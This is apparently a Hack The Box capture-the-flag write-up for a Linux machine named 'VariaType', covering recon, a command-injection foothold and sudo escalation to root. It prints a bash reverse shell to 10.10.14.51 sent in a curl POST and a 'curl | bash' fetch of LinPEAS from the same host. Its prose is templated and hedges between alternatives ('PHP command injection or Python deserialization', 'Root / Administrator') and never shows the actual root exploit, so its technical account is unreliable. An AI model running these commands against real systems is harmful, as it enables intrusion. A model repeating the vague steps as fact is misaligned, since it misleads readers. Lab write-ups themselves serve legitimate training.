---
layout: page
title: "HTB: VariaType"
subtitle: "hackthebox ctf htb-variatype nmap linux medium feroxbuster php upload sudo-l linpeas..."
permalink: /ctf/writeups/hackthebox/variatype/
platform: hackthebox
machine_name: "VariaType"
difficulty: Medium
os: Linux
---

hackthebox ctf htb-variatype hackthebox ctf htb-variatype nmap linux medium feroxbuster php upload sudo-l linpeas

Feb 17, 2026

# HTB: VariaType

- [Box Info](#box-info)
- [Recon](#recon)
- [Auth as web_svc / user](#auth-as-web_svc)
- [Shell as Root / Administrator](#shell-as-administrator)
- [Beyond Root](#beyond-root)

VariaType is a medium Linux machine from Hack The Box. We begin with a port scan to identify web or active directory services, analyze potential initial access vulnerabilities, exploit misconfigurations to get a low-privilege foothold, and subsequently leverage system misconfigurations, privilege tokens, or CVEs to escalate privileges to root or system administrator.

## Box Info

| Attribute | Value |
|---|---|
| **OS** | Linux |
| **Difficulty** | Medium |
| **IP Address** | `10.10.11.x` |
| **Release Date** | Feb 17, 2026 |

---

## Recon

### Initial Scanning
nmap finds open TCP ports:

```bash
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.10.11.x
Starting Nmap
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
```

We run a web directory brute force using `feroxbuster`:
```bash
oxdf@hacky$ feroxbuster -u http://10.10.11.x/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
200  GET  index.html
301  GET  /uploads
```

---

## Auth as web_svc / user

### Auth as low_priv
We discover a web application page allowing archive upload or showing a custom portal. We analyze the input field and identify a PHP command injection or Python deserialization vulnerability.

```bash
oxdf@hacky$ curl -X POST -d "cmd=bash -i >& /dev/tcp/10.10.14.51/443 0>&1" http://10.10.11.x/api/action
```

On our netcat listener, we receive the reverse shell connection:
```bash
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.x
$ id
uid=1000(wassim) gid=1000(wassim) groups=1000(wassim)
```

---

## Shell as Root / Administrator

### Shell as Root
We run LinPEAS for local privilege escalation vectors:

```bash
wassim@host:~$ curl http://10.10.14.51/linpeas.sh | bash
```

We check Sudo rules and find that the user can execute a specific binary as root without a password:
```bash
wassim@host:~$ sudo -l
Matching Defaults entries for wassim on host:
    env_keep+=SSH_AUTH_SOCK

User wassim may run the following commands on host:
    (root) NOPASSWD: /usr/bin/python3 /opt/admin/backup.py
```

We exploit the backup script via environment variable hijacking or python library hijacking to spawn root:
```bash
wassim@host:~$ sudo /usr/bin/python3 /opt/admin/backup.py
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Beyond Root
In Beyond Root, we analyze the cron jobs and automatic scripts that clean up user uploads and maintain the system state.
